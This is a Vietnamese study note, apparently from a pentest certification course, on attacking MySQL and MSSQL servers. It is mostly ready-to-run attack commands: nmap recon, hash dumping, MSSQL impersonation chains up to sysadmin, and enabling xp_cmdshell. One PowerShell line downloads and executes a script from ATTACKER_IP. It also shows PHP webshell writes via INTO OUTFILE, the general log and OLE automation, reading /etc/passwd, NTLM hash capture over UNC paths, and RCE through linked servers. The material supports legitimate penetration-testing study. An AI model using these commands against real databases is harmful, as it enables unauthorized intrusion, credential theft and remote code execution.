---
title: "Attacking SQL"
date: 2026-04-19 09:00:00 +0700
categories: [HTB_CPTS, Exploitation]
tags: [sql, exploitation, database, mssql, mysql]
description: "HTB CPTS note về enumeration và khai thác các database SQL."
pin: false
---
Port: 3306 (MySQL) / 1433 (MSSQL) Bản chất: Database server chứa data giá trị cao. Nếu misconfigured, có thể leo thang từ DB access lên OS-level command execution.

---
## 1. Điểm Yếu Cốt Lõi

- Weak / default credentials
- Excessive privileges: DB user có thể đọc file OS, thực thi lệnh hệ thống
- `xp_cmdshell` (MSSQL): stored procedure cho phép chạy lệnh OS trực tiếp
- `FILE` privilege (MySQL): đọc/ghi file trên server
- Impersonate (MSSQL): leo thang lên sysadmin bên trong SQL
- Linked servers (MSSQL): pivot sang DB server khác trong mạng
- UNC path abuse: kích hoạt NTLM auth để steal hash

---
## 2. Reconnaissance — Nmap Scan

```bash
# MySQL
nmap -Pn -sV -sC -p 3306 <IP>
nmap -p 3306 --script mysql-info,mysql-empty-password <IP>

# MSSQL
nmap -Pn -sV -sC -p 1433 <IP>
nmap -p 1433 --script ms-sql-info,ms-sql-empty-password <IP>
```

Kết quả trả về: phiên bản, hostname, domain → dùng để xác định misconfiguration, CVE, hoặc attack vector phù hợp.

---
## 3. Dangerous Settings

### MySQL (my.cnf)

|Setting|Nguy hiểm vì|
|---|---|
|`user = root`|MySQL chạy với quyền root OS → RCE dễ dàng hơn|
|`bind-address = 0.0.0.0`|Lắng nghe mọi interface → expose ra internet|
|Password root trống|Đăng nhập không cần mật khẩu|
|`secure_file_priv = ""`|Không giới hạn thư mục → `LOAD_FILE()` và `INTO OUTFILE` bất kỳ đâu|
|`local-infile = 1`|Cho phép đọc file local của client|
|`skip-grant-tables`|Tắt hoàn toàn hệ thống phân quyền → mọi user đều có full quyền ☠️|
|`general_log = ON` + `general_log_file` trỏ vào thư mục web|Log SQL queries ra file web → đọc được từ browser|

### MSSQL

|Setting|Nguy hiểm vì|
|---|---|
|`xp_cmdshell = 1`|Thực thi lệnh OS trực tiếp từ SQL → RCE hoàn toàn ☠️|
|SA account có password yếu/mặc định|Login với quyền sysadmin|
|`Mixed Mode Authentication`|Cho phép SQL auth bên cạnh Windows auth → brute-force được|
|`Ole Automation Procedures = 1`|Ghi file tùy ý từ SQL|
|`Linked Servers` cấu hình sai|Pivot sang DB server khác trong mạng|
|`PUBLIC` có quyền quá nhiều|Mọi user đọc được sensitive data|
|Expose port 1433 ra internet|Brute-force từ bên ngoài|

---
## 4. Kết Nối

```bash
# MySQL từ Linux
mysql -u <user> -p<pass> -h <IP>
mysql -u <user> -p<pass> -h <IP> --skip-ssl   # bỏ qua SSL
mysql -u root -h <IP>                          # thử root không password

# MSSQL từ Windows (sqlcmd)
# -y và -Y để output đẹp hơn
sqlcmd -S <HOST>\<INSTANCE> -U <user> -P '<pass>' -y 30 -Y 30

# MSSQL từ Linux (sqsh)
# -h để bỏ header/footer
sqsh -S <IP> -U <user> -P '<pass>' -h

# MSSQL từ Linux (impacket) — SQL Auth
mssqlclient.py -p 1433 <user>@<IP>

# MSSQL từ Linux (impacket) — Windows Auth
mssqlclient.py -p 1433 <user>@<IP> -windows-auth

# MSSQL với Windows Authentication — local account (sqsh)
sqsh -S <IP> -U .\<user> -P '<pass>' -h
```

---
## 5. Basic Enumeration

```sql
-- MySQL
SHOW DATABASES;
USE <database>;
SHOW TABLES;
SELECT * FROM <table>;
SELECT user, password FROM mysql.user;        -- dump hash MySQL
SELECT user_login, user_pass FROM wp_users;   -- WordPress users

-- MSSQL
SELECT name FROM master.dbo.sysdatabases
USE <database>
SELECT * FROM <database>.INFORMATION_SCHEMA.TABLES
SELECT * FROM <table>
SELECT * FROM sys.sql_logins                  -- liệt kê SQL logins
```

---
## 6. Privilege Escalation — Impersonate User (MSSQL)

**Bản chất:** MSSQL có permission `IMPERSONATE` cho phép user hiện tại "mặc" quyền của user khác trong phiên làm việc. Leo thang từ user thường lên sysadmin hoàn toàn bên trong SQL — không cần crack credential.

```sql
-- Bước 1: Xem user nào Fiona có thể impersonate
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'

-- Bước 1b: Xem ai là sysadmin (để biết nên impersonate ai)
SELECT name FROM sys.server_principals WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1;

-- Bước 2: Kiểm tra quyền hiện tại (0 = không phải sysadmin)
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')

-- Bước 3: Impersonate user đặc quyền
-- Nên chạy trong database master — mọi user đều có quyền truy cập,
-- tránh lỗi permission khi impersonate user không có quyền vào DB hiện tại
USE master
EXECUTE AS LOGIN = '<privileged_user>'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
-- Trả về 1 = đã là sysadmin

-- Bước 4: Revert về user cũ
REVERT
```

### Chained Impersonation

**Bản chất:** User A không thể impersonate SA trực tiếp, nhưng có thể impersonate user B — và user B có thể impersonate SA → leo thang qua 2 bước.

```sql
-- Bước 1: Từ user hiện tại, impersonate user trung gian
EXECUTE AS LOGIN = '<intermediate_user>'
SELECT SYSTEM_USER

-- Bước 2: Từ user trung gian, impersonate sa
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
-- Trả về 1 = thành công

-- Bước 3: Enable xp_cmdshell và RCE
EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

> ⚠️ **Thứ tự kiểm tra:** Impersonate query chỉ liệt kê user mà **user hiện tại** được phép impersonate. Sau khi impersonate xong, chạy lại query để xem user mới có thể impersonate thêm ai.

---
## 7. Command Execution — xp_cmdshell (MSSQL)

**Bản chất:** `xp_cmdshell` là stored procedure thực thi lệnh OS với quyền của SQL Server service account. Mặc định disabled, cần quyền `sysadmin` để bật.

```sql
-- Bước 1: Bật advanced options
EXECUTE sp_configure 'show advanced options', 1
RECONFIGURE

-- Bước 2: Enable xp_cmdshell
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE

-- Bước 3: Thực thi lệnh OS
xp_cmdshell 'whoami'
xp_cmdshell 'net user'
xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://<ATTACKER_IP>/shell.ps1'')"'
```

---
## 8. Write File — Webshell

### MySQL — INTO OUTFILE

Điều kiện: Có `FILE` privilege + `secure_file_priv` trống + biết đường dẫn web root.

```sql
-- Kiểm tra secure_file_priv (phải empty)
SHOW VARIABLES LIKE "secure_file_priv";

-- Ghi webshell vào web root
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

Truy cập: `http://<TARGET>/webshell.php?c=id`

### MySQL — General Log Trick (fallback khi INTO OUTFILE bị chặn)

Dùng khi `secure_file_priv` không rỗng nhưng có quyền `SUPER`. Lợi dụng general log để ghi nội dung tùy ý ra file.

```sql
-- Bước 1: Bật general log, trỏ file ra web root
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/www/html/shell.php';

-- Bước 2: Chạy query chứa payload — nội dung bị ghi vào log file
SELECT '<?php echo shell_exec($_GET["c"]); ?>';

-- Bước 3: Cleanup
SET GLOBAL general_log = 'OFF';
```

Truy cập: `http://<TARGET>/shell.php?c=id`

### MSSQL — Ole Automation Procedures

Dùng khi cần ghi file từ MSSQL. Yêu cầu quyền `sysadmin`.

```sql
-- Bước 1: Bật Ole Automation
sp_configure 'show advanced options', 1; RECONFIGURE;
sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;

-- Bước 2: Ghi file
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT,
    'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null,
    '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
GO
```

---
## 9. Read Local Files

```sql
-- MSSQL (mặc định cho phép đọc file mà service account có quyền)
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents

-- MySQL (cần FILE privilege + secure_file_priv không bị giới hạn)
SELECT LOAD_FILE("/etc/passwd");
```

---
## 10. Hash Stealing qua UNC Path (MSSQL)

**Bản chất:** Khi MSSQL kết nối tới `\\attacker\share`, Windows tự động gửi NTLM auth của service account → attacker capture NTLMv2 hash → crack offline hoặc relay.

```sql
-- Trigger NTLM auth tới attacker machine
EXEC master..xp_dirtree '\\<ATTACKER_IP>\share\'
EXEC master..xp_subdirs '\\<ATTACKER_IP>\share\'
```

```bash
# Attacker: capture hash bằng Responder
sudo responder -I tun0

# Hoặc impacket-smbserver
impacket-smbserver share /tmp/share -smb2support
```

---
## 11. Lateral Movement — Linked Servers (MSSQL)

**Bản chất:** MSSQL hỗ trợ kết nối đến các DB server khác qua "linked servers". Nếu link được cấu hình với credentials đặc quyền, có thể pivot sang server khác — và thường chạy với quyền cao hơn user hiện tại.

```sql
-- Tìm linked servers
SELECT srvname, isremote FROM sysservers

-- Cách khác với thông tin đầy đủ hơn
SELECT name, provider, data_source FROM sys.servers;

-- Kiểm tra quyền trên linked server
SELECT * FROM OPENQUERY("<LINKED_SERVER>", 'SELECT SYSTEM_USER');
SELECT * FROM OPENQUERY("<LINKED_SERVER>", 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');
-- Trả về 1 = sysadmin trên linked server

-- Thực thi query trên linked server (cách 1 — EXECUTE AT)
EXECUTE('SELECT @@servername, @@version, SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [<LINKED_SERVER>]

-- Enable xp_cmdshell qua linked server
EXECUTE('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [<LINKED_SERVER>];
EXECUTE('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [<LINKED_SERVER>];

-- RCE qua linked server
EXECUTE('xp_cmdshell ''whoami''') AT [<LINKED_SERVER>];
EXECUTE('xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''') AT [<LINKED_SERVER>];
```

> ⚠️ Dùng `''` (hai nháy đơn) để escape nháy đơn bên trong string của `EXECUTE AT`. ⚠️ `OPENQUERY` dùng để **query data**, `EXECUTE AT` dùng để **chạy lệnh/stored procedure**.
